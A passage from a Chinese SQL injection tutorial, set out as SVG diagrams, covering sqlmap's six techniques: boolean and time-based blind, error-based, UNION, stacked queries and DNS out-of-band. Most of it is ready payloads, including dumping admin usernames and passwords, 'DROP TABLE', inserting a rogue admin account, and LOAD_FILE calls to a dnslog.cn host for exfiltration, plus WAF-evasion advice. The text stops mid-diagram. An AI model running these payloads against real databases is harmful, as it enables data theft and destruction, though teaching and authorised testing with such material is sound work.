## 4.6 六种注入技术详解

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 560" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss07" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss07g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s07dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss07g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss07dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-7 六大注入技术 6 卡详解：核心原理一句话 + 典型 Payload</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">技术对应 --technique B / E / U / S / T / O，单独用某一种= --technique=T 只走时间盲注</text>  <rect x="35" y="105" width="335" height="200" rx="10" fill="#0f172a" stroke="#f59e0b" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="35" y="105" width="335" height="30" rx="10" fill="#f59e0b" opacity="0.20"/>  <text x="202.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">① B 布尔盲注</text>  <text x="202.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">页面差异 True/False → 二分猜每个字符 ASCI</text>  <text x="202.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">I</text>  <text x="202.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">AND ascii(substr(user(),1,1))&gt;97</text>  <text x="202.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">AND 1=1 正常；AND 1=2 报错页</text>  <rect x="45" y="267" width="315" height="28" rx="6" fill="#020617" stroke="#f59e0b"/>  <text x="202" y="285" text-anchor="middle" font-size="11" font-weight="700" fill="#f59e0b" font-family="Consolas,Monospace">--technique B</text>  <rect x="380" y="105" width="335" height="200" rx="10" fill="#0f172a" stroke="#0ea5e9" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="380" y="105" width="335" height="30" rx="10" fill="#0ea5e9" opacity="0.20"/>  <text x="547.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">② E 报错注入</text>  <text x="547.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">利用 DB 特殊函数主动抛错 → 在报错消息里带出数据</text>  <text x="547.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="547.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MySQL: extractvalue/updatexml/NAME_CONST</text>  <text x="547.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MSSQL: convert(int,@@version)</text>  <rect x="390" y="267" width="315" height="28" rx="6" fill="#020617" stroke="#0ea5e9"/>  <text x="547" y="285" text-anchor="middle" font-size="11" font-weight="700" fill="#0ea5e9" font-family="Consolas,Monospace">--technique E</text>  <rect x="725" y="105" width="335" height="200" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="725" y="105" width="335" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="892.5" y="125" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">③ U 联合查询</text>  <text x="892.5" y="155" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">前后两条 SELECT UNION 拼接 → 页面直接出结果</text>  <text x="892.5" y="171" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <text x="892.5" y="187" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">ORDER BY N → 猜列数</text>  <text x="892.5" y="203" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">UNION SELECT NULL,user(),version()-- -</text>  <rect x="735" y="267" width="315" height="28" rx="6" fill="#020617" stroke="#10b981"/>  <text x="892" y="285" text-anchor="middle" font-size="11" font-weight="700" fill="#10b981" font-family="Consolas,Monospace">--technique U</text>  <rect x="35" y="315" width="335" height="200" rx="10" fill="#0f172a" stroke="#a855f7" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="35" y="315" width="335" height="30" rx="10" fill="#a855f7" opacity="0.20"/>  <text x="202.5" y="335" text-anchor="middle" font-size="13" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">④ S 堆叠查询</text>  <text x="202.5" y="365" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">; 号多语句执行 → 增删改查/CREATE/DROP/IN</text>  <text x="202.5" y="381" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">SERT 全支持</text>  <text x="202.5" y="397" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">; DROP TABLE users;-- -</text>  <text x="202.5" y="413" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">; INSERT INTO u VALUES(1,'x','123456');--</text>  <rect x="45" y="477" width="315" height="28" rx="6" fill="#020617" stroke="#a855f7"/>  <text x="202" y="495" text-anchor="middle" font-size="11" font-weight="700" fill="#a855f7" font-family="Consolas,Monospace">--technique S</text>  <rect x="380" y="315" width="335" height="200" rx="10" fill="#0f172a" stroke="#ef4444" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="380" y="315" width="335" height="30" rx="10" fill="#ef4444" opacity="0.20"/>  <text x="547.5" y="335" text-anchor="middle" font-size="13" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">⑤ T 时间盲注</text>  <text x="547.5" y="365" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">无任何回显 → SLEEP/BENCHMARK 看响应延迟判</text>  <text x="547.5" y="381" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">断 True/False</text>  <text x="547.5" y="397" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">AND SLEEP(5) → 5 秒后返回=True</text>  <text x="547.5" y="413" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">PostgreSQL: AND pg_sleep(5)</text>  <rect x="390" y="477" width="315" height="28" rx="6" fill="#020617" stroke="#ef4444"/>  <text x="547" y="495" text-anchor="middle" font-size="11" font-weight="700" fill="#ef4444" font-family="Consolas,Monospace">--technique T</text>  <rect x="725" y="315" width="335" height="200" rx="10" fill="#0f172a" stroke="#8b5cf6" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="725" y="315" width="335" height="30" rx="10" fill="#8b5cf6" opacity="0.20"/>  <text x="892.5" y="335" text-anchor="middle" font-size="13" font-weight="800" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">⑥ O OOB 外带</text>  <text x="892.5" y="365" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">通过 DNS/HTTP 请求把数据带出 → 适合不出网但能查</text>  <text x="892.5" y="381" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> DNS 的服务器</text>  <text x="892.5" y="397" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MySQL: LOAD_FILE('\\x.dnslog.cn\a')</text>  <text x="892.5" y="413" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">MSSQL: exec master..xp_dirtree</text>  <rect x="735" y="477" width="315" height="28" rx="6" fill="#020617" stroke="#8b5cf6"/>  <text x="892" y="495" text-anchor="middle" font-size="11" font-weight="700" fill="#8b5cf6" font-family="Consolas,Monospace">--technique O</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">注：S 堆叠仅 MS SQL/MySQLi（PDO 默认禁用多语句）；O 需要配合 DNSLog.cn / Ceye.io 使用</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss08" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss08g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s08dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss08g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss08dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-8 布尔盲注 vs 时间盲注：双流程对比图（90% 慢注入都在这里）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">布尔=看页面『真/假』两态；时间=看响应『延迟 5s / 不延迟』两态 → 本质都是二分猜 ASCII</text>  <rect x="30" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#f59e0b"/>  <text x="280" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#f59e0b" font-family="Microsoft YaHei,Arial">布尔盲注 (Boolean-based) --technique B · 字符速度 ~8 个/秒</text>  <circle cx="68" cy="200" r="14" fill="#f59e0b" opacity="0.3"/>  <circle cx="68" cy="200" r="9" fill="#f59e0b"/>  <text x="68" y="204" text-anchor="middle" font-size="11" font-weight="800" fill="#000" font-family="Consolas">1</text>  <text x="98" y="195" font-size="11.5" font-weight="700" fill="#fcd34d" font-family="Microsoft YaHei,Arial">1 构造真值</text>  <text x="98" y="213" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">?id=1 AND 1=1 → 正常页面</text>  <defs><marker id="a6821868308" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#f59e0b"/></marker></defs>  <line x1="68" y1="218" x2="68" y2="308" stroke="#f59e0b" stroke-width="2" marker-end="url(#a6821868308)"/>  <circle cx="68" cy="290" r="14" fill="#f59e0b" opacity="0.3"/>  <circle cx="68" cy="290" r="9" fill="#f59e0b"/>  <text x="68" y="294" text-anchor="middle" font-size="11" font-weight="800" fill="#000" font-family="Consolas">2</text>  <text x="98" y="285" font-size="11.5" font-weight="700" fill="#fcd34d" font-family="Microsoft YaHei,Arial">2 构造假值</text>  <text x="98" y="303" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">?id=1 AND 1=2 → 页面短一截/无数据</text>  <defs><marker id="a6830868398" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#f59e0b"/></marker></defs>  <line x1="68" y1="308" x2="68" y2="398" stroke="#f59e0b" stroke-width="2" marker-end="url(#a6830868398)"/>  <circle cx="68" cy="380" r="14" fill="#f59e0b" opacity="0.3"/>  <circle cx="68" cy="380" r="9" fill="#f59e0b"/>  <text x="68" y="384" text-anchor="middle" font-size="11" font-weight="800" fill="#000" font-family="Consolas">3</text>  <text x="98" y="375" font-size="11.5" font-weight="700" fill="#fcd34d" font-family="Microsoft YaHei,Arial">3 猜首字符 ASCII</text>  <text x="98" y="393" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">AND ascii(substr(user(),1,1))&gt;97 → 真? 再上二分</text>  <defs><marker id="a6839868488" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#f59e0b"/></marker></defs>  <line x1="68" y1="398" x2="68" y2="488" stroke="#f59e0b" stroke-width="2" marker-end="url(#a6839868488)"/>  <circle cx="68" cy="470" r="14" fill="#f59e0b" opacity="0.3"/>  <circle cx="68" cy="470" r="9" fill="#f59e0b"/>  <text x="68" y="474" text-anchor="middle" font-size="11" font-weight="800" fill="#000" font-family="Consolas">4</text>  <text x="98" y="465" font-size="11.5" font-weight="700" fill="#fcd34d" font-family="Microsoft YaHei,Arial">4 二分迭代</text>  <text x="98" y="483" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">ASCII 32~126 → 每字符 7 次请求</text>  <defs><marker id="a6848868578" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#f59e0b"/></marker></defs>  <line x1="68" y1="488" x2="68" y2="578" stroke="#f59e0b" stroke-width="2" marker-end="url(#a6848868578)"/>  <circle cx="68" cy="560" r="14" fill="#f59e0b" opacity="0.3"/>  <circle cx="68" cy="560" r="9" fill="#f59e0b"/>  <text x="68" y="564" text-anchor="middle" font-size="11" font-weight="800" fill="#000" font-family="Consolas">5</text>  <text x="98" y="555" font-size="11.5" font-weight="700" fill="#fcd34d" font-family="Microsoft YaHei,Arial">5 拼结果</text>  <text x="98" y="573" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">user() = root@localhost (14 字符 ≈ 98 次请求)</text>  <rect x="550" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#ef4444"/>  <text x="800" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#ef4444" font-family="Microsoft YaHei,Arial">时间盲注 (Time-based) --technique T · 字符速度 ~0.5 个/秒</text>  <circle cx="588" cy="200" r="14" fill="#ef4444" opacity="0.3"/>  <circle cx="588" cy="200" r="9" fill="#ef4444"/>  <text x="588" y="204" text-anchor="middle" font-size="11" font-weight="800" fill="#fff" font-family="Consolas">1</text>  <text x="618" y="195" font-size="11.5" font-weight="700" fill="#fca5a5" font-family="Microsoft YaHei,Arial">1 设置基准</text>  <text x="618" y="213" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">?id=1 → 正常响应 300ms</text>  <defs><marker id="a588218588308" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="588" y1="218" x2="588" y2="308" stroke="#ef4444" stroke-width="2" marker-end="url(#a588218588308)"/>  <circle cx="588" cy="290" r="14" fill="#ef4444" opacity="0.3"/>  <circle cx="588" cy="290" r="9" fill="#ef4444"/>  <text x="588" y="294" text-anchor="middle" font-size="11" font-weight="800" fill="#fff" font-family="Consolas">2</text>  <text x="618" y="285" font-size="11.5" font-weight="700" fill="#fca5a5" font-family="Microsoft YaHei,Arial">2 注入 SLEEP</text>  <text x="618" y="303" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">?id=1 AND SLEEP(5) → 响应 5.3s ✔ 命中</text>  <defs><marker id="a588308588398" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="588" y1="308" x2="588" y2="398" stroke="#ef4444" stroke-width="2" marker-end="url(#a588308588398)"/>  <circle cx="588" cy="380" r="14" fill="#ef4444" opacity="0.3"/>  <circle cx="588" cy="380" r="9" fill="#ef4444"/>  <text x="588" y="384" text-anchor="middle" font-size="11" font-weight="800" fill="#fff" font-family="Consolas">3</text>  <text x="618" y="375" font-size="11.5" font-weight="700" fill="#fca5a5" font-family="Microsoft YaHei,Arial">3 猜 ASCII + 延迟</text>  <text x="618" y="393" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">AND IF(ascii(substr(user(),1,1))&gt;97,SLEEP(5),0)</text>  <defs><marker id="a588398588488" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="588" y1="398" x2="588" y2="488" stroke="#ef4444" stroke-width="2" marker-end="url(#a588398588488)"/>  <circle cx="588" cy="470" r="14" fill="#ef4444" opacity="0.3"/>  <circle cx="588" cy="470" r="9" fill="#ef4444"/>  <text x="588" y="474" text-anchor="middle" font-size="11" font-weight="800" fill="#fff" font-family="Consolas">4</text>  <text x="618" y="465" font-size="11.5" font-weight="700" fill="#fca5a5" font-family="Microsoft YaHei,Arial">4 二分（更慢）</text>  <text x="618" y="483" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">每判断=等 5s → 1 字符=35 秒</text>  <defs><marker id="a588488588578" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#ef4444"/></marker></defs>  <line x1="588" y1="488" x2="588" y2="578" stroke="#ef4444" stroke-width="2" marker-end="url(#a588488588578)"/>  <circle cx="588" cy="560" r="14" fill="#ef4444" opacity="0.3"/>  <circle cx="588" cy="560" r="9" fill="#ef4444"/>  <text x="588" y="564" text-anchor="middle" font-size="11" font-weight="800" fill="#fff" font-family="Consolas">5</text>  <text x="618" y="555" font-size="11.5" font-weight="700" fill="#fca5a5" font-family="Microsoft YaHei,Arial">5 耐心=胜利</text>  <text x="618" y="573" font-size="10" fill="#e2e8f0" font-family="Consolas,Microsoft YaHei,Arial">user() 14 字符 ≈ 8 分钟 + 别 Ctrl+C</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">时间盲注加速技巧：--time-sec=2（2 秒足够）+ --threads=8（高并发）+ -p 指定单参数 可提速 3×~5×</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss09" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss09g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s09dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss09g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss09dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-9 报错注入 vs 联合查询：两大『秒出数据』神器原理对比</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">能 E 不 B，能 U 不 E = 注入铁律（1 次请求出全库 vs 800 次请求的区别）</text>  <rect x="30" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#0ea5e9"/>  <text x="280" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">报错注入 (Error-based) · MySQL / MSSQL / Oracle 三大常用语法</text>  <text x="50" y="152" font-size="12" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">① MySQL extractvalue（长度 32 位限制 → 用 substr 分块）</text>  <rect x="50" y="162" width="460" height="36" rx="6" fill="#020617" stroke="#0ea5e9"/>  <text x="280" y="185" text-anchor="middle" font-size="10.5" fill="#67e8f9" font-family="Consolas,Monospace">AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))</text>  <text x="50" y="222" font-size="12" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">② MSSQL convert 强制类型转换报错</text>  <rect x="50" y="232" width="460" height="36" rx="6" fill="#020617" stroke="#0ea5e9"/>  <text x="280" y="255" text-anchor="middle" font-size="10.5" fill="#67e8f9" font-family="Consolas,Monospace">AND 1=convert(int,(SELECT top 1 name FROM master..sysdatabases))</text>  <text x="50" y="292" font-size="12" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">③ Oracle ctxsys.drithsx.sn + XMLType 报错</text>  <rect x="50" y="302" width="460" height="36" rx="6" fill="#020617" stroke="#0ea5e9"/>  <text x="280" y="325" text-anchor="middle" font-size="10.5" fill="#67e8f9" font-family="Consolas,Monospace">AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))</text>  <rect x="50" y="358" width="460" height="108" rx="10" fill="#020617" stroke="#fde047"/>  <text x="80" y="382" font-size="12" font-weight="700" fill="#fde047" font-family="Microsoft YaHei,Arial">⚠ 报错注入返回数据长度限制：</text>  <text x="70" y="404" font-size="10.5" fill="#fef9c3" font-family="Microsoft YaHei,Arial">· MySQL extractvalue / updatexml = 每次 31 字符 → mid(user(),1,31), mid(user(),32,31) 分块</text>  <text x="70" y="422" font-size="10.5" fill="#fef9c3" font-family="Microsoft YaHei,Arial">· MSSQL convert 报错无限制但只返回 TOP 1 → for xml path('') 拼接成一行</text>  <text x="70" y="440" font-size="10.5" fill="#fef9c3" font-family="Microsoft YaHei,Arial">· Oracle 支持 CLOB，报错字符串 4000 字符上限 → DBMS_XMLGEN 转码后取</text>  <rect x="550" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#10b981"/>  <text x="800" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">UNION 联合查询 (U-based) · 要求：前后 SELECT 列数相同 + 数据类型兼容</text>  <rect x="570" y="150" width="460" height="76" rx="10" fill="#0f172a" stroke="#10b981" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="150" width="460" height="30" rx="10" fill="#10b981" opacity="0.20"/>  <text x="800.0" y="170" text-anchor="middle" font-size="13" font-weight="800" fill="#10b981" font-family="Microsoft YaHei,Arial">Step 1 猜列数</text>  <text x="800.0" y="200" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">ORDER BY 1 / ORDER BY 2 / ORDER BY 3 ...</text>  <text x="800.0" y="216" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"> → ORDER BY 4 报错=3列</text>  <rect x="570" y="240" width="460" height="76" rx="10" fill="#0f172a" stroke="#34d399" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="240" width="460" height="30" rx="10" fill="#34d399" opacity="0.20"/>  <text x="800.0" y="260" text-anchor="middle" font-size="13" font-weight="800" fill="#34d399" font-family="Microsoft YaHei,Arial">Step 2 NULL 填充</text>  <text x="800.0" y="290" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">UNION SELECT NULL,NULL,NULL → 不报错=列数确认 ✓</text>  <text x="800.0" y="306" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="570" y="330" width="460" height="76" rx="10" fill="#0f172a" stroke="#059669" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="330" width="460" height="30" rx="10" fill="#059669" opacity="0.20"/>  <text x="800.0" y="350" text-anchor="middle" font-size="13" font-weight="800" fill="#059669" font-family="Microsoft YaHei,Arial">Step 3 找显示位</text>  <text x="800.0" y="380" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">UNION SELECT 1,2,3 → 页面上显示 2=第 2 位是显示位</text>  <text x="800.0" y="396" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial"></text>  <rect x="570" y="420" width="460" height="76" rx="10" fill="#0f172a" stroke="#047857" stroke-width="1.6" filter="url(#s01s)"/>  <rect x="570" y="420" width="460" height="30" rx="10" fill="#047857" opacity="0.20"/>  <text x="800.0" y="440" text-anchor="middle" font-size="13" font-weight="800" fill="#047857" font-family="Microsoft YaHei,Arial">Step 4 查数据</text>  <text x="800.0" y="470" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">UNION SELECT 1,(SELECT group_concat(user</text>  <text x="800.0" y="486" text-anchor="middle" font-size="10.5" fill="#cbd5e1" font-family="Microsoft YaHei,Arial">name,0x3a,password) from admin),3</text>  <rect x="570" y="420" width="460" height="46" rx="8" fill="#020617" stroke="#dc2626"/>  <text x="800" y="440" text-anchor="middle" font-size="11" fill="#fca5a5" font-family="Microsoft YaHei,Arial">UNION 常见坑：列数对了但类型错（数字列不能塞字符串） → 全用 NULL + 逐个 cast(xx as char) 解决</text>  <rect x="30" y="505" width="1020" height="24" rx="8" fill="#020617" stroke="#1e293b"/>
  <text x="540" y="521" text-anchor="middle" font-size="11" fill="#93c5fd" font-family="Microsoft YaHei,Arial">UNION + group_concat() = 1 次请求导出整张表；WAF 绕不开时再降级报错→布尔→时间</text>
</svg>

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1080 540" width="100%" style="max-width:1080px;background:#020617;border:1px solid #1e293b;border-radius:14px;margin:16px 0;display:block">
  <defs>
    <filter id="ss10" x="-10%" y="-10%" width="120%" height="130%"><feDropShadow dx="0" dy="3" stdDeviation="3" flood-color="#000" flood-opacity="0.35"/></filter>
    <linearGradient id="ss10g" x1="0" x2="1" y1="0" y2="1"><stop offset="0%" stop-color="#1e3a8a"/><stop offset="100%" stop-color="#4c1d95"/></linearGradient>
    <pattern id="s10dot" width="18" height="18" patternUnits="userSpaceOnUse"><circle cx="3" cy="3" r="0.9" fill="#1e293b"/></pattern>
  </defs>
  <rect width="1080" height="100%" fill="url(#ss10g)" opacity="0.08"/>
  <rect width="1080" height="100%" fill="url(#ss10dot)" opacity="0.6"/>
  <rect x="24" y="18" width="1032" height="44" rx="12" fill="#111c35" stroke="#6366f1"/>
  <text x="60" y="46" font-size="18" font-weight="800" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">图 4-10 堆叠查询 vs OOB 外带：高级注入杀手锏（增删改 + 不出网外带）</text>  <text x="60" y="76" font-size="12.5" fill="#94a3b8" font-family="Microsoft YaHei,Arial">堆叠=执行任意多语句；OOB=数据通过 DNS/HTTP 流出 → 完全绕过『无回显』死局</text>  <rect x="30" y="100" width="500" height="380" rx="14" fill="#0b1530" stroke="#a855f7"/>  <text x="280" y="128" text-anchor="middle" font-size="15" font-weight="800" fill="#a855f7" font-family="Microsoft YaHei,Arial">堆叠查询 (Stacked) · 支持 DB：MS SQL + MySQL(i 驱动) + PostgreSQL</text>  <rect x="50" y="150" width="160" height="26" fill="#1e293b" stroke="#6366f1"/>  <text x="130.0" y="167" text-anchor="middle" font-size="11.5" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">你可以做的操作</text>  <rect x="220" y="150" width="310" height="26" fill="#1e293b" stroke="#6366f1"/>  <text x="375.0" y="167" text-anchor="middle" font-size="11.5" font-weight="700" fill="#bfdbfe" font-family="Microsoft YaHei,Arial">对应的一条 ; 分号分隔 SQL 示例</text>  <rect x="50" y="176" width="160" height="62" fill="#111c35" stroke="#334155"/>  <text x="130.0" y="211.0" text-anchor="middle" font-size="11" font-weight="700" fill="#0ea5e9" font-family="Microsoft YaHei,Arial">1 SELECT 正常查</text>  <rect x="220" y="176" width="310" height="62" fill="#111c35" stroke="#334155"/>  <text x="228" y="200" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">; SELECT user(), database(), version()</text>  <rect x="50" y="238" width="160" height="62" fill="#0b1530" stroke="#334155"/>  <text x="130.0" y="273.0" text-anchor="middle" font-size="11" font-weight="700" fill="#8b5cf6" font-family="Microsoft YaHei,Arial">2 INSERT 新增管理员</text>  <rect x="220" y="238" width="310" height="62" fill="#0b1530" stroke="#334155"/>  <text x="228" y="262" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">; INSERT INTO admin(username,password) V</text>  <text x="228" y="279" font-size="9.5" fill="#e2e8f0" font-family="Consolas,Monospace">ALUES('hack','e10adc3949ba59abbe56e057f2</text>  <rect x="50" y="300" width="160" height="62" fill="#111c35" stroke="#334155"/>  <text x="130.0" y="335.0" text-anchor="middle" font-size="11" font-weight="700" fill="#a855f7" font-family="Microsoft YaHei,Arial">3 UPDATE 改超级管理员</text>  <rect x="220" y="300" width="310" height="62" fill="#111c35" stroke="#334155"/>  <text x="228" y="324" font-size="9.5" fill="#e2e8f0" 